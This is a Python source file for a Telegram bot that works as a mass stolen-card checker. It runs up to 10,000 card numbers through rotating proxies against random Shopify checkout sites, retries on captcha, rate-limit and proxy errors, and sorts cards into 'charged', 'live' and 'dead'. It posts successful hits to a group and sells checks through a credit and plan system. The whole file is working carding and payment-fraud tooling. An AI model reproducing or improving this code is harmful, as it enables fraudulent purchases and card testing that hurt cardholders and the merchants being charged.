def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    session = MSH_SESSIONS.get(session_id, {})
    approved_count = session.get('approved', 0)
    dead_count = session.get('dead', 0)
    charged_count = session.get('charged', 0)
    checked_count = session.get('checked', 0)

    buttons = [
        [{"text": f"Lɪᴠᴇ ({approved_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack(), "style": "success", "icon_custom_emoji_id": BTN_LIVE_EMOJI_ID},
         {"text": f"Dᴇᴀᴅ ({dead_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="dead").pack(), "style": "danger", "icon_custom_emoji_id": BTN_DEAD_EMOJI_ID}],
        [{"text": f"Cʜᴀʀɢᴇᴅ ({charged_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="charged").pack(), "style": "primary", "icon_custom_emoji_id": BTN_CHARGED_EMOJI_ID},
         {"text": f"Aʟʟ ({checked_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="all").pack(), "style": "primary", "icon_custom_emoji_id": BTN_ALL_EMOJI_ID}]
    ]
    if is_running:
        buttons.append([{"text": "Sᴛᴏᴘ Cʜᴇᴄᴋɪɴɢ", "callback_data": MshStopCallback(session_id=session_id).pack(), "style": "danger", "icon_custom_emoji_id": BTN_STOP_EMOJI_ID}])
    return {"inline_keyboard": buttons}

async def update_progress_message(bot: Bot, session_id):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    if time.time() < session.get('flood_until', 0):
        return

    is_finished = session['status'] == "FINISHED"
    is_stopped = session['status'] == "STOPPED"

    if session_id not in SESSION_LOCKS:
        SESSION_LOCKS[session_id] = asyncio.Lock()

    async with SESSION_LOCKS[session_id]:
        current_time = time.time()
        if time.time() < session.get('flood_until', 0):
            return
        if not is_finished and not is_stopped and (current_time - session.get('last_update_time', 0)) < 30.0:
            return

        elapsed = current_time - session['start_time']
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

        status_icon = "<tg-emoji emoji-id=\"5163643969422231511\">🔄</tg-emoji>" if session['status'] == "CHECKING" else ("🛑" if session['status'] == "STOPPED" else "<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji>")
        status_text = session['status']
        if status_text == "CHECKING": status_text = f"<i>{status_text}</i>"
        elif status_text == "STOPPED": status_text = f"<b>{status_text}</b>"
        elif status_text == "FINISHED": status_text = f"<b>{status_text}</b>"

        text = mass_status_frame(
            "𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗠𝗔𝗦𝗦",
            session['status'],
            session['checked'],
            session['total'],
            session['approved'],
            session['charged'],
            session['dead'],
            session['errors'],
            elapsed_str,
            session_id,
        )

        if session.get('last_text') == text:
            return

        is_running = session['status'] == "CHECKING"
        reply_markup = get_result_buttons(session_id, is_running=is_running)
        try:
            await bot.edit_message_text(chat_id=session['chat_id'], message_id=session['msg_id'], text=text, parse_mode="HTML", reply_markup=reply_markup)
            session['last_text'] = text
            session['last_update_time'] = current_time
        except TelegramRetryAfter as e:
            session['flood_until'] = time.time() + e.retry_after + 2
            logging.warning(f"[MSH] Flood detected, pausing {e.retry_after}s")
        except TelegramBadRequest as e:
            error_msg = str(e).lower()
            if "retry after" in error_msg:
                match = re.search(r'retry after (\d+)', str(e))
                if match:
                    session['flood_until'] = time.time() + int(match.group(1)) + 2
            elif "message is not modified" not in error_msg:
                if "can't parse entities" in error_msg:
                    try:
                        await bot.edit_message_text(chat_id=session['chat_id'], message_id=session['msg_id'], text=session.get('last_text', 'Processing...'), parse_mode=None)
                    except:
                        pass
                logging.error(f"Error updating progress: {e}")
        except Exception as e:
            logging.error(f"Error updating progress: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session or is_session_stopped(session_id):
        return

    is_premium = session.get('is_premium', False)

    sites_list = get_sites()
    if not sites_list:
        logging.error(f"[MSH] sites.txt is empty")
        session['errors'] += 1
        return

    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        logging.error(f"[MSH] No proxy manager found")
        session['errors'] += 1
        return

    DECLINED_RESPONSES = [
        'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_ERROR', 'GENERIC_DECLINE',
        'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'UNKNOWN ERROR', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK',
        'FRAUD_SUSPECTED', 'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
        'TEST_MODE_LIVE_CARD', 'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
        'EMPTY SUBMIT RESPONSE', 'INVALID JSON IN SUBMIT RESPONSE', 'INVALID JSON RESPONSE',
        'POLICY_CLASS', 'VALIDATION_CUSTOM', 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
        'ARTIFACT_DISSATISFACTION', 'PAYMENTS_CREDIT_CARD_GENERIC',
        'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'CART FAILED WITH STATUS',
        'UNABLE TO GET PAYMENT TOKEN', 'EMPTY RECEIPT', 'RECEIPT ID MISSING',
        'SITE NOT SUPPORTED'
    ]
    
    RETRY_KEYWORDS = [
        'r4 token empty', 'payment method is not shopify', 'r2 id empty',
        'product not found', 'hcaptcha detected', 'site error! status: 429',
        'site requires login', 'failed to get checkout', 'captcha at checkout',
        'failed to get session token',
        'timeout', '502', '503', '504', 'bad gateway', 'gateway timeout',
        'empty submit response', 'invalid json in submit response', 'invalid json response',
        'policy_class', 'validation_custom', 'delivery_delivery_line_detail_changed',
        'artifact_dissatisfaction', 'payments_credit_card_generic',
        'payments_credit_card_brand_not_supported', 'cart failed with status',
        'unable to get payment token', 'empty receipt', 'receipt id missing',
        'site not supported',
        'total changed', 'no payment token', 'cart 429', 'no session token',
        'status 429', 'captcha_required', 'merchandise_expected_price_mismatch',
        'test_mode', 'proxy_dead', 'tax_new_tax_must_be_accepted', '<html',
        'site error (http 429)'
    ]

    result_status = "ERROR"
    response_msg = "Unknown Error"
    api_price = "0.00"
    proxy_status_formatted = "Unknown"
    bin_data = {}
    used_proxy = None

    MAX_RETRIES = 5
    price_retries = 0
    attempt = 0

    parts = cc_formatted.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2: yy = "20" + yy

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except:
        bin_data = {}

    while attempt < MAX_RETRIES and not is_session_stopped(session_id):
        attempt += 1
        proxy_result = proxy_manager.get_next_proxy()
        if not proxy_result:
            session['errors'] += 1
            return

        proxy, is_rotated = proxy_result
        used_proxy = proxy
        site = random.choice(sites_list)

        try:
            success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy)

            if is_session_stopped(session_id):
                return

            proxy_status_formatted = "Live <tg-emoji emoji-id=\"5854964615510762741\">🟢</tg-emoji>" if "live" in str(proxy_status_raw).lower() else "Dead"
            api_price = price
            proxy_manager.report_result(proxy, message, http_status)

            # Price lock: skip sites charging more than $5
            try:
                clean_price = float(re.sub(r'[^\d.]', '', str(api_price)))
                if clean_price > 5.00:
                    price_retries += 1
                    if price_retries < MAX_RETRIES:
                        await asyncio.sleep(0.3)
                        continue
                    else:
                        result_status = "DEAD"
                        response_msg = "PRICE_TOO_HIGH"
                        break
            except (ValueError, TypeError):
                pass

            message_upper = message.upper()
            message_lower = message.lower()

            if success and message_upper.strip() in ("ORDER_PLACED", "ORDER_PAID"):
                result_status = "CHARGED"
                response_msg = safe_html(message)
                break
            elif ("3DS_REQUIRED" in message_upper or "INSUFFICIENT_FUND" in message_upper or "DS_REQUIRED" in message_upper or "INVALID_CVC" in message_upper or "OTP_REQUIRED" in message_upper):
                result_status = "APPROVED"
                response_msg = safe_html(message)
                break
            elif ("CARD_DECLINED" in message_upper or "DECLINED" in message_upper or "DO_NOT_HONOR" in message_upper or any(d in message_upper for d in DECLINED_RESPONSES)):
                result_status = "DEAD"
                response_msg = "CARD_DECLINED"
                break
            else:
                is_proxy_error = proxy_manager.is_real_proxy_error(message, http_status)
                if is_proxy_error:
                    if attempt == MAX_RETRIES:
                        result_status = "ERROR"
                        response_msg = f"Proxy Error: {message}"
                        break
                    await asyncio.sleep(0.5)
                    continue
                elif any(retry_err.lower() in message_lower for retry_err in RETRY_KEYWORDS):
                    if attempt < MAX_RETRIES:
                        await asyncio.sleep(0.3)
                        continue
                    else:
                        result_status = "DEAD"
                        response_msg = "CARD_DECLINED"
                        break
                else:
                    if attempt < MAX_RETRIES:
                        await asyncio.sleep(0.3)
                        continue
                    else:
                        result_status = "ERROR"
                        response_msg = safe_html(message)
                        break

        except asyncio.CancelledError:
            raise
        except Exception as e:
            proxy_manager.report_result(proxy, str(e), None)
            if attempt == MAX_RETRIES:
                result_status = "ERROR"
                response_msg = "Connection Error"
                break
            await asyncio.sleep(0.5)
            continue

    if is_session_stopped(session_id):
        return

    print(f"{cc_formatted} | {result_status} | {response_msg} | {api_price} {currency}")
    session['checked'] += 1

    card_result_data = {'card': cc_formatted, 'response': response_msg, 'bin_info': bin_data, 'price': api_price, 'currency': currency, 'gateway': 'Shopify', 'timestamp': datetime.now().isoformat(), 'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A'}

    if result_status == "CHARGED":
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)
        _tasks = [asyncio.to_thread(update_user_stats, user_id, True), asyncio.to_thread(update_user_hits, user_id)]
        if not is_premium and user_id not in ADMIN_IDS:
            _tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 2))
        await asyncio.gather(*_tasks)
        await asyncio.gather(send_hit_log_to_group(bot, response_msg, user_obj, plan_name, proxy_status_formatted, api_price, currency), send_charged_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency))
    elif result_status == "APPROVED":
        session['approved'] += 1
        session['live_cards'].append(card_result_data)
        _tasks = [asyncio.to_thread(update_user_stats, user_id, True)]
        if not is_premium and user_id not in ADMIN_IDS:
            _tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 1))
        await asyncio.gather(*_tasks)
        await send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency)
    elif result_status == "DEAD":
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)
        _tasks = [asyncio.to_thread(update_user_stats, user_id, False)]
        if not is_premium and user_id not in ADMIN_IDS:
            _tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 1))
        await asyncio.gather(*_tasks)
    elif result_status == "ERROR":
        session['errors'] += 1
        session['error_cards'].append(card_result_data)
        await asyncio.to_thread(update_user_stats, user_id, False)

    await update_progress_message(bot, session_id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session_id = callback_data.session_id
        result_type = callback_data.result_type
        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return
        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"⏳ Please wait {remaining} seconds", show_alert=True)
            return

        count = 0
        if result_type == "charged":
            count = len(session.get('charged_cards', []))
        elif result_type == "live":
            count = len(session.get('live_cards', []))
        elif result_type == "dead":
            count = len(session.get('dead_cards', []))
        else:
            count = len(session.get('charged_cards', [])) + len(session.get('live_cards', [])) + len(session.get('dead_cards', [])) + len(session.get('error_cards', []))

        if count == 0:
            await callback.answer("❌ No cards found", show_alert=True)
            return

        # Only show generating report if there are cards
        await callback.answer("📦 Generating report...", show_alert=False)

        user_obj = session.get('user_obj')
        plan_name = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')

        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)
        file_content = file_buffer.read()

        emoji = {"charged": random_diamond(), "live": "<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji>", "dead": "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji>", "all": "📁"}.get(result_type, "📁")
        label = {"charged": "CHARGED", "live": "Live", "dead": "Dead", "all": "All"}.get(result_type, "All")
        caption = f"Result Type → {label} {emoji}\nTotal Cards → <b>{total_count}</b>\nGateway → Shopify Mass"

        document = types.BufferedInputFile(file=file_content, filename=filename)

        try:
            await callback.bot.send_document(chat_id=callback.message.chat.id, document=document, caption=caption, parse_mode="HTML", reply_to_message_id=user_msg_id)
        except TelegramBadRequest as e:
            if "message to reply not found" in str(e).lower():
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise

    except Exception as e:
        logging.error(f"Error handling result callback: {e}", exc_info=True)
        try:
            await callback.message.answer(f"<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except:
            pass

@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session_id = callback_data.session_id
        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return
        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"⏳ Please wait {remaining} seconds", show_alert=True)
            return
        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True)
            return

        session['status'] = "STOPPED"
        cancelled_count = 0
        for task in session.get('tasks', []):
            if not task.done():
                task.cancel()
                cancelled_count += 1

        await callback.answer("🛑 Stopping...", show_alert=False)
        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)

    except Exception as e:
        logging.error(f"Error handling stop callback: {e}", exc_info=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API MANAGEMENT COMMANDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("apistats"))
async def apistats_command(message: types.Message):
    user_id = message.from_user.id
    ADMIN_IDS = [6113616017]
    
    if user_id not in ADMIN_IDS:
        await message.answer("<tg-emoji emoji-id=\"5213415377593185638\">⛔</tg-emoji> <b>You are not authorized.</b>", parse_mode="HTML")
        return
    
    stats = get_api_stats()
    text = "🔌 <b>API Endpoint Status</b>\n<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
    
    for short_name, health in stats.items():
        status_icon = "<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji>" if health["healthy"] else "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji>"
        text += f"{status_icon} <b>{short_name}</b>\n"
        text += f"   └─ Failures: <code>{health['fail_count']}</code> | Success: <code>{health['success_count']}</code>\n"
        if not health["healthy"]:
            last_fail = int(time.time() - health["last_fail"])
            text += f"   └─ Cooldown: <code>{last_fail}s</code> remaining\n"
        text += "\n"
    
    text += f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
    text += f"<b>Total APIs:</b> <code>{len(API_ENDPOINTS)}</code>\n"
    text += f"<b>Healthy:</b> <code>{sum(1 for h in stats.values() if h['healthy'])}</code>\n"
    text += f"<b>Mode:</b> Auto-Failover & Round-Robin"
    
    await message.answer(text, parse_mode="HTML")

@router.message(Command("addapi"))
async def addapi_command(message: types.Message):
    user_id = message.from_user.id
    ADMIN_IDS = [6113616017]
    
    if user_id not in ADMIN_IDS:
        await message.answer("<tg-emoji emoji-id=\"5213415377593185638\">⛔</tg-emoji> <b>You are not authorized.</b>", parse_mode="HTML")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Usage:</b> /addapi <code>https://example.com/shopify</code>", parse_mode="HTML")
        return
    
    new_api = parts[1].strip()
    
    if add_api_endpoint(new_api):
        await message.answer(f"<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji> <b>API Endpoint Added!</b>\n\n<b>New Endpoint:</b> <code>{new_api}</code>\n<b>Total APIs:</b> <code>{len(API_ENDPOINTS)}</code>", parse_mode="HTML")
    else:
        await message.answer(f"<tg-emoji emoji-id=\"5213205860498549992\">⚠️</tg-emoji> <b>API already exists!</b>", parse_mode="HTML")

@router.message(Command("removeapi"))
async def removeapi_command(message: types.Message):
    user_id = message.from_user.id
    ADMIN_IDS = [6113616017]
    
    if user_id not in ADMIN_IDS:
        await message.answer("<tg-emoji emoji-id=\"5213415377593185638\">⛔</tg-emoji> <b>You are not authorized.</b>", parse_mode="HTML")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Usage:</b> /removeapi <code>index_number</code>", parse_mode="HTML")
        return
    
    try:
        index = int(parts[1].strip()) - 1
        if 0 <= index < len(API_ENDPOINTS):
            removed = API_ENDPOINTS.pop(index)
            if removed in API_HEALTH:
                del API_HEALTH[removed]
            
            try:
                with open("api_endpoints.txt", "w", encoding="utf-8") as f:
                    for endpoint in API_ENDPOINTS:
                        f.write(f"{endpoint}\n")
            except Exception as e:
                logging.error(f"Error saving API endpoints: {e}")
            
            await message.answer(f"<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji> <b>API Removed!</b>\n\n<b>Removed:</b> <code>{removed}</code>\n<b>Remaining APIs:</b> <code>{len(API_ENDPOINTS)}</code>", parse_mode="HTML")
        else:
            await message.answer(f"<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Invalid index!</b> Please enter a number between 1 and {len(API_ENDPOINTS)}", parse_mode="HTML")
    except ValueError:
        await message.answer("<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Please provide a valid number!</b>", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/msh") | F.caption.startswith("/msh"))
async def msh_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "msh"):
        await message.reply("🚧 <b>Mass Gate under Maintenance.</b>", parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id
    bot = message.bot
    is_premium, _ = get_premium_status(user_id)

    for session_data in MSH_SESSIONS.values():
        if session_data.get('user_id') == user_id and session_data.get('status') == "CHECKING":
            await message.reply("<tg-emoji emoji-id=\"5213205860498549992\">⚠️</tg-emoji> <b>Active Session</b>\n\nYou have a check running.\nUse the <b>🛑 Stop</b> button to stop it.", parse_mode="HTML")
            return

    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        user_proxies = await get_user_proxies(8058825724)
        if not user_proxies:
            await message.reply("<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>No proxies found.</b>\n\nAdd proxies with <code>/proxy</code> and try again.", parse_mode="HTML")
            return

    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "

    if message.reply_to_message:
        replied_msg = message.reply_to_message
        if replied_msg.text:
            raw_text += replied_msg.text + " "
        elif replied_msg.caption:
            raw_text += replied_msg.caption + " "

    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document

    if document:
        if document.file_size > 2 * 1024 * 1024:
            await message.reply("<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> File too large. Max 2MB.")
            return
        try:
            file_info = await bot.get_file(document.file_id)
            byte_content = await bot.download_file(file_info.file_path)
            if byte_content:
                data = byte_content.read() if hasattr(byte_content, 'read') else byte_content
                raw_text += data.decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply("<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>No cards found.</b>\n\n• <code>/msh cc|mm|yy|cvv</code>\n• Reply to cards with <code>/msh</code>\n• Send .txt file with <code>/msh</code>", parse_mode="HTML")
        return

    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> No valid card formats found.", parse_mode="HTML")
        return

    valid_cards = []
    expired_count = 0
    invalid_luhn_count = 0

    for card_string in extracted_cards:
        parts_c = card_string.split('|')
        if len(parts_c) != 4:
            continue
        cc, mm, yy, cvv = parts_c
        if not luhn_check(cc):
            invalid_luhn_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        filter_info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n" if expired_count > 0 or invalid_luhn_count > 0 else ""
        await message.reply(f"{filter_info}<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> No valid cards to check.", parse_mode="HTML")
        return

    if not is_premium and user_id not in ADMIN_IDS:
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        if current_credits <= 0:
            await message.reply(
                "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>No Credits Left</b>\n\n"
                "Use /buy to purchase a plan.",
                parse_mode="HTML"
            )
            return
        if current_credits < total_cards:
            valid_cards = valid_cards[:current_credits]
            total_cards = len(valid_cards)
            await message.reply(
                f"<tg-emoji emoji-id=\"5213205860498549992\">⚠️</tg-emoji> <b>Credits Limit</b>\n\n"
                f"You have <b>{current_credits}</b> credits.\n"
                f"Processing <b>{total_cards}</b> cards.",
                parse_mode="HTML"
            )

    if total_cards > 10000:
        valid_cards = valid_cards[:10000]
        total_cards = len(valid_cards)
        await message.reply(
            "<tg-emoji emoji-id=\"5213205860498549992\">⚠️</tg-emoji> <b>Card Limit</b>\n\n"
            "Premium limit is <b>10,000 cards</b>.\n"
            f"Processing <b>{total_cards}</b> cards.",
            parse_mode="HTML"
        )

    asyncio.create_task(process_mass_check_background(message, bot, valid_cards, user, user_proxies, is_premium=is_premium))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_mass_check_background(message: types.Message, bot: Bot, valid_cards: list, user_obj, user_proxies, is_group: bool = False, is_premium: bool = False):
    user_id = user_obj.id
    chat_id = message.chat.id
    total_cards = len(valid_cards)

    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name = await get_user_plan_name(user_id)
    proxy_manager = ProxyManager(user_proxies, session_id)
    initial_text = mass_status_frame(
        "𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗠𝗔𝗦𝗦",
        "CHECKING",
        0,
        total_cards,
        0,
        0,
        0,
        0,
        "0s",
        session_id,
    )

    progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=get_result_buttons(session_id, is_running=True))

    MSH_SESSIONS[session_id] = {
        "session_id": session_id, "status": "CHECKING", "chat_id": chat_id, "user_id": user_id,
        "msg_id": progress_msg.message_id, "user_msg_id": message.message_id, "total": total_cards,
        "checked": 0, "approved": 0, "charged": 0, "dead": 0, "errors": 0, "start_time": time.time(),
        "tasks": [], "proxies": user_proxies, "proxy_manager": proxy_manager, "bad_proxies": [],
        "last_text": "", "last_update_time": 0, "live_cards": [], "dead_cards": [], "charged_cards": [],
        "error_cards": [], "user_obj": user_obj, "plan_name": plan_name, "is_group": is_group, "is_premium": is_premium,
    }

    asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))

async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session: return

    sem = asyncio.Semaphore(100)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(session_id, cc_formatted, cc_num, session['user_id'], bot, user_obj, plan_name)
            except asyncio.CancelledError:
                raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    logging.error(f"Worker error for {cc_formatted}: {e}")

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id):
            break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        session['tasks'].append(task)

    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "STOPPED":
        session['status'] = "FINISHED"

    await update_progress_message(bot, session_id)